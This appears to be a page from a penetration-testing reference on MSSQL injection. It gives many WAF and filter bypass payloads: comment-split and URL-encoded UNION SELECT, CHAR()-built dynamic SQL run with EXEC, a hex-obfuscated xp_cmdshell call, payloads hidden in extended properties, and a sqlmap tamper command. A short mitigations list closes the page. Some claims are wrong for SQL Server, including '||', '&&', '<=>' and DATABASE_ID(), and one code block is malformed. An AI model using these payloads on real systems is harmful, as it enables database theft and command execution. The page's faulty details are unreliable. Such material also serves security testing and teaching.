---
title: Fuzzing and Obfuscation
description: Techniques for bypassing defenses in MSSQL injection
category: Advanced Techniques
order: 16
tags: ["obfuscation", "WAF bypass", "filter evasion"]
lastUpdated: 2025-03-15
---

## Fuzzing and Obfuscation

Modern web applications often implement security measures like Web Application Firewalls (WAFs) and input filters to prevent SQL injection. Fuzzing and obfuscation techniques can help bypass these protections by disguising malicious SQL commands in ways that security tools may miss but the database will still execute.

### Comment Variations

SQL Server supports various comment styles that can be used to break up SQL keywords:

```sql
-- Standard SQL comments
SELECT/*comment*/username,password/**/FROM/**/users

-- Single-line comment requires a space
SELECT -- comment
username FROM users WHERE id = 1

-- Line continuation with CHAR(10) as newline
SELECT CHAR(10) username FROM users
```

### Whitespace Manipulation

SQL Server is flexible with whitespace, allowing creative formatting:

````sql
-- Using tabs, newlines, and carriage returns
SELECT
username
FROM
users

-- Unicode whitespace characters (not all supported in SQL Server)
SELECT%A0username%A0FROM%A0users

-- Excessive whitespace
SELECT       username       FROM       users

### IIS/ASP Specific Obfuscation
In ASP(x) applications, percentage signs can be placed between characters to bypass filters, as IIS strips them before passing the query to the database:

```sql
-- "SELECT" with % signs
S%E%L%E%C%T column FROM table

-- "AND 1=1" with % signs (and multiple % signs)
A%%ND 1=%%%%%%%%1
````

### Allowed Intermediary Characters (Whitespace)

The following characters can be used instead of spaces:

| Hex   | Description          |
| ----- | -------------------- |
| `%01` | Start of Heading     |
| `%02` | Start of Text        |
| `%03` | End of Text          |
| `%04` | End of Transmission  |
| `%05` | Enquiry              |
| `%06` | Acknowledge          |
| `%07` | Bell                 |
| `%08` | Backspace            |
| `%09` | Horizontal Tab       |
| `%0A` | New Line             |
| `%0B` | Vertical Tab         |
| `%0C` | Form Feed            |
| `%0D` | Carriage Return      |
| `%0E` | Shift Out            |
| `%0F` | Shift In             |
| `%10` | Data Link Escape     |
| `%11` | Device Control 1     |
| `%12` | Device Control 2     |
| `%13` | Device Control 3     |
| `%14` | Device Control 4     |
| `%15` | Negative Acknowledge |
| `%16` | Synchronous Idle     |
| `%17` | End of Trans. Block  |
| `%18` | Cancel               |
| `%19` | End of Medium        |
| `%1A` | Substitute           |
| `%1B` | Escape               |
| `%1C` | File Separator       |
| `%1D` | Group Separator      |
| `%1E` | Record Separator     |
| `%1F` | Unit Separator       |
| `%20` | Space                |
| `%25` | Percent Sign         |

### Characters Avoiding Spaces

These characters can replace spaces in certain contexts:

| Character | Description  | Example                                                |
| --------- | ------------ | ------------------------------------------------------ |
| `"`       | Double quote | `SELECT"column"FROM"table"`                            |
| `(` `)`   | Parentheses  | `UNION(SELECT(column)FROM(table))`                     |
| `[` `]`   | Brackets     | `SELECT[column_name]FROM[information_schema].[tables]` |

### Characters After AND/OR

The following characters can appear immediately after AND/OR:

| Hex       | Character | Description   |
| --------- | --------- | ------------- |
| `%01-%20` | Various   | Control chars |
| `%21`     | `!`       | Exclamation   |
| `%2B`     | `+`       | Plus          |
| `%2D`     | `-`       | Minus         |
| `%2E`     | `.`       | Period        |
| `%5C`     | `\`       | Backslash     |
| `%7E`     | `~`       | Tilde         |

Example:

```sql
SELECT 1 FROM[table]WHERE\1=\1AND\1=\1
```

### Case Variation

SQL Server keywords are case-insensitive:

```sql
select USERNAME from USERS where ID=1
SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
```

### Operator Alternatives

Some operators have alternative representations:

```sql
-- OR alternatives
1 OR 1=1
1 || 1=1  -- Works if ANSI_NULLS is OFF


-- AND alternatives
1 AND 1=1
1 && 1=1  -- Works if ANSI_NULLS is OFF

-- Equal alternatives
id=1
id<=>1  -- Works in some contexts
```

### String Representation

Strings can be represented in multiple ways:

```sql
-- Using CHAR function
SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110) -- 'admin'

-- Using NCHAR for Unicode
SELECT NCHAR(97) + NCHAR(100) + NCHAR(109) + NCHAR(105) + NCHAR(110) -- N'admin'

-- Using concatenation
SELECT 'ad' + 'min'

-- Hex representation (SQL Server 2005+)
SELECT 0x61646D696E -- 'admin'

-- String literals with N prefix (Unicode)
SELECT N'admin'
```

### Numeric Representation

Numbers can be represented in various ways:

```sql
-- Mathematical expressions
SELECT * FROM users WHERE id = 1+0

-- Boolean conversions
SELECT * FROM users WHERE id = (1=1)  -- Returns 1

-- Subqueries
SELECT * FROM users WHERE id = (SELECT 1)

-- Hexadecimal (0x notation)
SELECT * FROM users WHERE id = 0x1 -- hex for 1
```

### Function Call Obfuscation

Function names can be obfuscated using dynamic SQL:

```sql
-- Using variables to build function names
DECLARE @f varchar(100) = 'S' + 'ELECT'
EXEC(@f + ' * FROM users')

-- Using QUOTENAME (with some limitations)
DECLARE @t varchar(100) = QUOTENAME('users')
EXEC('SELECT * FROM ' + @t)
```

### Using SQL Server-Specific Features

#### Using Extended Stored Procedures

```sql
-- Using xp_cmdshell indirectly
DECLARE @x varchar(100) = 0x78705F636D647368656C6C -- hex for 'xp_cmdshell'
EXEC('EXEC ' + @x + ' ''dir''')
```

#### Using Cast and Convert

```sql
-- Using CAST to obfuscate
SELECT * FROM users WHERE id = CAST(0x31 AS int) -- 0x31 is hex for '1'

-- Using CONVERT
SELECT * FROM users WHERE id = CONVERT(int, 0x31)
```

### WAF Bypass Techniques

#### Special Characters and Encodings

```sql
-- URL encoding (depends on how application processes input)
SELECT%20*%20FROM%20users

-- Double URL encoding
SELECT%2520*%2520FROM%2520users

-- Unicode-wide characters
SELECT+%u0055NION+%u0053ELECT+1,2,3--

-- HTML Entities (for web contexts)
-- AND 1=1 as HTML entities:
%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
```

#### Breaking Up Keywords

```sql
-- Split with comments
UN/**/ION SEL/**/ECT 1,2,3--

-- Split with variables
DECLARE @u varchar(10) = 'UN' + 'ION'
DECLARE @s varchar(10) = 'SEL' + 'ECT'
EXEC(@u + ' ' + @s + ' 1,2,3--')
```

#### Alternative Function Forms

```sql
-- Using DATABASE_ID instead of DB_ID
SELECT DB_NAME(DATABASE_ID()) -- Current database

-- Using SUBSTRING instead of LEFT
SELECT SUBSTRING(name, 1, 3) FROM sys.databases -- Same as LEFT(name, 3)
```

### Practical SQL Injection Examples

#### WAF Bypass with Obfuscation

```sql
-- Instead of: UNION SELECT 1,2,3
' %55NION %53ELECT 1,2,3--

-- Instead of: OR 1=1
' OR/**/'1'='1

-- Instead of: SELECT @@version
' %53ELECT %40%40version--
```

#### Bypassing Keyword Filters

If 'SELECT' is blocked:

```sql
-- Using character encoding
' DECLARE @s nvarchar(100) = CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(70) + CHAR(82) + CHAR(79) + CHAR(77) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115); EXEC(@s)--
-- This builds and executes: SELECT * FROM users
```

If 'UNION' is blocked:

```sql
-- Constructing with variables
' DECLARE @u nvarchar(100) = CHAR(85) + CHAR(78) + CHAR(73) + CHAR(79) + CHAR(78) + CHAR(32) + CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(49) + CHAR(44) + CHAR(50); EXEC(@u)--
-- This builds and executes: UNION SELECT 1,2
```

#### Advanced Evasion Examples

```sql
-- Using dynamic SQL and EXECUTE to avoid direct detection
'; DECLARE @q nvarchar(100); SET @q = 'SEL' + 'ECT * F' + 'ROM users'; EXEC(@q)--

-- Using SQL Server XML features to hide payloads
'; WITH xmldata AS (SELECT CAST('<root><a>SELECT * FROM users</a></root>' AS XML) as xmlval) SELECT xmlval.value('/root[1]/a[1]', 'varchar(100)') FROM xmldata--
```

### Automated Fuzzing

Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:

```bash
sqlmap --url="http://target/page.php?id=1" --tamper=charencode,space2comment,randomcase --technique=U
```

### MSSQL-Specific Obfuscation Techniques

#### Using Built-in Variables

```sql
-- Using built-in variables instead of literals
' UNION SELECT DB_NAME(), USER_NAME()--
```

#### Using Database Collation to Bypass Filters

```sql
-- Case-sensitive collation comparison
' UNION ALL SELECT 'SEL' + 'ECT' COLLATE Latin1_General_CS_AS--
```

#### Using SQL Server's extended properties

```sql
-- Hiding payload in extended properties
EXEC sp_addextendedproperty 'payload', 'SELECT * FROM users', 'SCHEMA', 'dbo', 'TABLE', 'SomeTable';
DECLARE @p varchar(100); SELECT @p = value FROM sys.extended_properties WHERE name = 'payload'; EXEC(@p);
```

### Mitigations

To protect against obfuscation techniques:

1. Use parameterized queries instead of string concatenation
2. Implement a WAF with updated signatures that recognize obfuscation patterns
3. Use positive security models (whitelist valid patterns)
4. Limit the database user's privileges
5. Consider using an ORM that prevents direct SQL access
6. Monitor and rate-limit suspicious queries
7. Use SQL Server's built-in security features like Extended Events to monitor for unusual SQL patterns
